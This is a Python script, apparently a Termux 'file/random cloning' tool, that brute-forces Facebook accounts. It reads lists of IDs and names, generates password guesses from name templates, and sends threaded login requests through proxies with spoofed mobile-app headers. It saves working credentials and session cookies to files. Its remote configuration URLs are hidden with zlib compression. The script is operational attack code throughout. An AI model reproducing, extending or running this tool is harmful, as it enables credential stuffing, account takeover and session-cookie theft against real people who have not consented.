...
sys.stdout.write('\x1b]2; RABINDRA~XD\x07')
#-------CONTROL UPDATE+OFF
#xnx = requests.get('https://raw.githubusercontent.com/RABINDRA-404/Control-room/main/Tool-controle/Tool-update-off.txt').text
...
#---------INSTALLING MODULES
##try:
  #  print(f'{red}[{white}●{red}]{green} INSTALLING MODULES PLEASE WAITING{red} ! {abir}');time.sleep(5)
#    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
...
try:
    ...
    print(f" {red}[{white}●{red}]{green} LOW INTERNET {red} !! ")
    sys.exit()
...
else:sys.exit(f" {red}[{white}●{red}]{green} DON'T ON YOUR LOCAL-CANARY NEXT TIME{red} !! ")
#---------OTHERS
myid=uuid.uuid4().hex[:5].upper()
try:
    key1 = open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.RABINDRA', 'r').read()
except:
    kok=open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.RABINDRA', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.RABINDRA', 'r').read()
kex=(f"RABINDRA|{uid}|404|{key1}|XD")
...
#---------FILE-UA1
try:
    F1 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5O\xd37\x04\x00\x85\n\x14\xdf'))
except:
    print('No Internet Connection.....');exit()
F1 = F1.strip()
#---------FILE-UA2
try:
    F2 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5O\xd37\x02\x00\x85\x0b\x14\xe0'))
except:
    print('No Internet Connection.....');exit()
F2 = F2.strip()
#---------FILE-UA3
try:
    F3 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5O\xd37\x06\x00\x85\x0c\x14\xe1'))
except:
    print('No Internet Connection.....');exit()
F3 = F3.strip()
#---------FILE-UA4
try:
    F4 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5O\xd37\x01\x00\x85\r\x14\xe2'))
except:
    print('No Internet Connection.....');exit()
F4 = F4.strip()
#---------FILE-UA5
try:
    F5 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5O\xd37\x05\x00\x85\x0e\x14\xe3'))
except:
    print('No Internet Connection.....');exit()
F5 = F5.strip()
#---------FILE-UA6
try:
    F6 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5O\xd37\x03\x00\x85\x0f\x14\xe4'))
except:
    print('No Internet Connection.....');exit()
F6 = F6.strip()
#---------RANDOM-UA1
try:
    R1 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5/\xd27\x04\x00\x85.\x14\xeb'))
except:
    print('No Internet Connection.....');exit()
R1 = R1.strip()
#---------RANDOM-UA2
try:
    R2 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5/\xd27\x02\x00\x85/\x14\xec'))
except:
    print('No Internet Connection.....');exit()
R2 = R2.strip()
#---------RANDOM-UA3
try:
    R3 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5/\xd27\x06\x00\x850\x14\xed'))
except:
    print('No Internet Connection.....');exit()
R3 = R3.strip()
#---------RANDOM-UA4
try:
    R4 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5/\xd27\x01\x00\x851\x14\xee'))
except:
    print('No Internet Connection.....');exit()
R4 = R4.strip()
#---------RANDOM-UA5
try:
    R5 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5/\xd27\x05\x00\x852\x14\xef'))
except:
    print('No Internet Connection.....');exit()
R5 = R5.strip()
#---------RANDOM-UA6
try:
    R6 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-.\xd1ur\xd1\xf7\xcf\xc8M\xcc\xd3\xcfM\xcc\xcc\xd3\x0f\xd5/\xd27\x03\x00\x853\x14\xf0'))
except:
    print('No Internet Connection.....');exit()
R6 = R6.strip()
#---------VIRSON
try:
    version = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fs\xf4\r\xf0\x0cr\xd5510\xd1w\x06\x8a\x17\xe5\xe7\xe8\x16\xe5\x03%r\x133\xf3\xe0"e\x99E\xc5\xf9y\xfa\x10\n\x00;u\x1fr'))
except:
    print('No Internet Connection.....');exit()
version = version.strip()
#---------STATUS
try:
    status = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fs\xf4\r\xf0\x0cr\xd5510\xd1w\x06\x8a\x17\xe5\xe7\xe8\x16\xe5\x03%r\x133\xf3\xe0"\xc5%\x89%\xa5\xc5\xfa\x10\n\x00;t\x1fx'))
except:
    print('No Internet Connection.....');exit()
status = status.strip()
#---------FILE METHOD
try:
    File = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fs\xf4\r\xf0\x0cr\xd5510\xd1w\x06\x8a\x17\xe5\xe7\xe8\x16\xe5\x03%r\x133\xf3\xe0"\xb9\xa9%\x19\xf9)\xfan\x999\xa9\x00\xfb\t\x1e1'))
except:
    print('No Internet Connection.....');exit()
File = File.strip()
#----------RANDOM METHOD
try:
    Random = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fs\xf4\r\xf0\x0cr\xd5510\xd1w\x06\x8a\x17\xe5\xe7\xe8\x16\xe5\x03%r\x133\xf3\xe0"\xb9\xa9%\x19\xf9)\xfaA\x89y)\xf9\xb9\x008\xea\x1f\x12'))
except:
    print('No Internet Connection.....');exit()
Random = Random.strip()
#--------APPROBLE LINK CHG
try:
    Link = py_get(zlib.decompress(b"x\x9c\x05\xc11\x0e\x800\x08\x00\xc0\x17Yv\xc7\xc6\xdd\xc5\x0f`%BR\xc0\x14\x1a\xe3\xef\xbd\xe3\xcc'V\x80\x81o\xb9%y\x9e3h4\xb7$\xcb\xd2\\\xe1\xa0\xc8\xa5n\xb0\xb3\xa2\x81\xa2\x18\xd4O\xac\xb1_\x8c\x1d\x7f(\xc3\x18["))
except:
    print('No Internet Connection.....');exit()
Link = Link.strip()
#---------LINExCLEAR
...
#---------LOGO
logo=(f"""{green}    _____          _       
{green}                               |_   _|        (_)      
{green}                                  | | ___ _ __  _  ___  
{green}                                  | |/ _ \ '_ \| |/ _ \ 
{green}                                  | |  __/ | | | | (_) |
{green}                                 \_/\___|_| |_| |\___/ 
{green}                                             _/ |      
{green}                                            |__/       
{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}
 {red}[{white}●{red}]{green} OWNER {white}      {red}➠ {green}︎RABI DRA POUDEL
 ...
 {red}[{white}●{red}]{green} GITHUB      {white}{red}➠︎ {green}RABINDRA-123-
...
{green}                             \_/\___|_| |_| |\___/ 
 ...
 {green}                                              |__/                  
{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}
 {red}[{white}●{red}]{green} OWNER {white}    {red}➠ {green}︎RABINDRA POUDEL
 {red}[{white}●{red}]{green} TOOL {white}     {red}➠{green} {green}FILE{red}×{green}RANDOM
 {red}[{white}●{red}]{green} STATUS      {white}{red}➠ \033[38;5;180m︎{status}
 {red}[{white}●{red}]{green} GITHUB    {white}{red}➠︎ {green}RABINDRA-404
 {red}[{white}●{red}]{green} VERSION   {white}{red}➠ \033[38;5;180m︎{version}
{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}""")
#---------APPROVE
urll = f"{Link}"
...
def ___ImRAn___MaIN___MenU___():
    ...
    elif __ERROR__ in ['B','b','02','2']:___Poudel___FiLE___MenU___()
    elif __ERROR__ in ['C','c','03','3']:___poudel___rANdOm___MenU___()
    elif __ERROR__ in ['D','d','04','4']:os.system('xdg open https://www.facebook.com/RABINDRA404OFFICIAL');exit()
...
def ___ImRAn___FiLE___MenU___():
    clear()
    print(f"{red}[{green}●{red}]{green} EXAMPLE{red} : {red}[{green}/sdcard/file.txt{red}]{green}")
    linex()
    file = input(f'{red}[{green}●{red}]{green} ENTER FILE PATH{red} :{green} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{red}[{green}●{red}]{green} FILE NOT FOUND...');time.sleep(2);main();linex()
#----------[INPUT FILE]---------#
    clear()
    print(f" {red}[{green}1{red}]{green} METHOD{red}[{green}M1{red}]{green}");print(f" {red}[{green}2{red}]{green} METHOD{red}[{green}M2{red}]{green}");print(f" {red}[{green}3{red}]{green} METHOD{red}[{green}M3{red}]{green}");print(f" {red}[{green}4{red}]{green} METHOD{red}[{green}M4{red}]{green}");print(f" {red}[{green}5{red}]{green} METHOD{red}[{green}M5{red}]{green}");print(f" {red}[{green}6{red}]{green} METHOD{red}[{green}M6{red}]{green}");linex()
#--------(CHOICE PASS)---------#
    mthd = input(f' {red}[{green}●{red}]{green} INPUT METHOD{red} :{green} ')
    plist=[];clear()
    try:
        ps_limit = int(input(f'{red}[{green}●{red}]{green} ENTER PASSWORD LIMIT {red}: {green}'))
    except:
        ps_limit =1
    clear()
    print(f"{red}[{green}●{red}]{green} EXAMPLE {red}: {green}firstlast,first@,first123....ETC");linex()
    for i in range(ps_limit):
        plist.append(input(f'{red}[{green}●{red}]{green} PUT PASSWORD {red}[{green}{i+1}{red}]{green} : '))
    with tred(max_workers=30) as _IM_R_AN_:
        clear()
        tl = str(len(fo))
        print(f"{red}[{green}●{red}]{green} TOTAL ID{red} : {yellow}{tl}")
        print(f"{red}[{green}●{red}]{green} IF NO RESULT {red}[{green}ON{red}/{green}OFF{red}] {green}AIRPLANE MODE");linex()
        for user in fo:
                    ids,names = user.split('|')
                    passlist = plist
                    if mthd =='1':
                        _IM_R_AN_.submit(m1,ids,names,passlist,tl)
                    elif mthd =='2':
                        _IM_R_AN_.submit(m2,ids,names,passlist,tl)
                    elif mthd =='3':
                        _IM_R_AN_.submit(m3,ids,names,passlist,tl)
                    elif mthd =='4':
                        _IM_R_AN_.submit(m4,ids,names,passlist,tl)
                    elif mthd =='5':
                        _IM_R_AN_.submit(m5,ids,names,passlist,tl)
                    elif mthd =='6':
                        _IM_R_AN_.submit(m6,ids,names,passlist,tl)
                    else:
                       ___ImRAn___FiLE___MenU___()
    linex()
    print(f" {red}[{green}≈{red}]{green} THE PROCESS HAS COMPLETE")
    print(f" {red}[{green}≈{red}]{green}  TOTAL ID : {white}{len(oks)}")
    linex();exit()
#---------FILE M1
def m1(ids,names,passlist,tl):
        try:
            ...
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f"\r {red}[{abir}RABINDRA{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
            sys.stdout.flush()
            fs = names.split(' ')[0]
            try:
                ls = names.split(' ')[1]
            ...
            for pw in passlist:
                ...
                with requests.Session() as session:
                    ...
                    head = {'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{F1}','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','X-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                    q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=head, proxies=bro, allow_redirects=False).json()
                    if 'session_key' in q:
                        cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        print(f"\r\r {red}[{green}RABINDRA-OK{red}] {green}{ids} {red}| {green}{pas} ")
                        open('/sdcard/RABINDRA/RABINDRA-FILE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                        oks.append(ids)
                        break
                    elif 'www.facebook.com' in q:
                        print(f"\r\r {green}[{red}RABINDRA-CP{green}]{green} {ids} {red}| {green}{pas} ")
                        open('/sdcard/RABINDRA/RABINDRA-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                    else:continue
            loop+=1
...
def m2(ids,names,passlist,tl):
    try:
        ...
        for pw in passlist:
            ...
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{F2}','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','X-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            q = requests.post('https://b-graph.facebook.com/auth/login',data=data, headers=head, proxies=bro, allow_redirects=False).json()
            if 'session_key' in q:
                cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\r {red}[{green}RABINDRA-OK{red}] {green}{ids} {red}| {green}{pas} ")
                open('/sdcard/RABINDRA/RABINDRA-FILE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
...
def m3(ids,names,passlist,tl):
    try:
        ...
        for pw in passlist:
            ...
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{F3}','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','X-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            q = requests.post('https://b-graph.facebook.com/auth/login',data=data, headers=head, proxies=bro, allow_redirects=False).json()
            if 'session_key' in q:
                cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\r {red}[{green}RABINDRA-OK{red}] {green}{ids} {red}| {green}{pas} ")
...
def m4(ids,names,passlist,tl):
        try:
            ...
            for pw in passlist:
                ...
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                    head = {'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{F4}','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','X-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                    q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=head, proxies=bro, allow_redirects=False).json()
                    if 'session_key' in q:
                         cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                         print(f"\r\r {red}[{green}RABINDRA-OK{red}] {green}{ids} {red}| {green}{pas} ")
        ...
        try:
            ...
            for pw in passlist:
                ...
                with requests.Session() as session:
                    ...
                    bro={"http":"socks4://"+prox}
                    data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                    head = {'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{F5}','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','X-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                    q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=head, proxies=bro, allow_redirects=False).json()
                    if 'session_key' in q:
                        cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        print(f"\r\r {red}[{green}RABINDRA-OK{red}] {green}{ids} {red}| {green}{pas} ")
    ...
    try:
        ...
        for pw in passlist:
            ...
            with requests.Session() as session:
                ...
                bro={"http":"socks4://"+prox}
                data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                head = {'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{F6}','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','X-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=head, proxies=bro, allow_redirects=False).json()
                if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     print(f"\r\r {red}[{green}RABINDRA-OK{red}] {green}{ids} {red}| {green}{pas} ")
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                    print(f" \r\r {red}[{green}RABINDRA-OK{red}] {green}{uid} {red}| {green}{pas} ") 
                    oks.append(ids)
                    open('/sdcard/RABINDRA/RABINDRA-M1-RN-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    print(f"\r\r {red}[{green}COOKIE{red}]{green} ={abir} {coki}")
                    break
            elif 'www.facebook.com' in q:
                cps.append(ids)
                print(f"\r\r {green}[{red}RABINDRA-CP{green}] {uid} {red}|{green} {pas} ")
                open('/sdcard/RABINDRA/RABINDRA-RNOM-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
...
def randm1(ids,psd,tl):
    ...
    try:
        for pas in psd:
            ...
            bro={"http":"socks4://"+prox}
            data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name': 'authenticate'}
            headers={'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{R2}','Accept-Encoding':  'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print(f"\r\r {red}[{green}RABINDRA-OK{red}] {green}{uid} {red}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/RABINDRA/RABINDRA-M2-RN-OK.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r {red}[{green}COOKIE{red}]{green} ={abir} {coki}")
                    break
            elif 'www.facebook.com' in q:
                cps.append(ids)
                print(f"\r\r {green}[{red}RABINDRA-CP{green}] {uid} {red}|{green} {pas} ")
                open('/sdcard/RABINDRA/RABINDRA-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')                
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
...
def randm2(ids,psd,tl):
    ...
    try:
        for pas in psd:
            ...
            bro={"http":"socks4://"+prox}
            data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name': 'authenticate'}
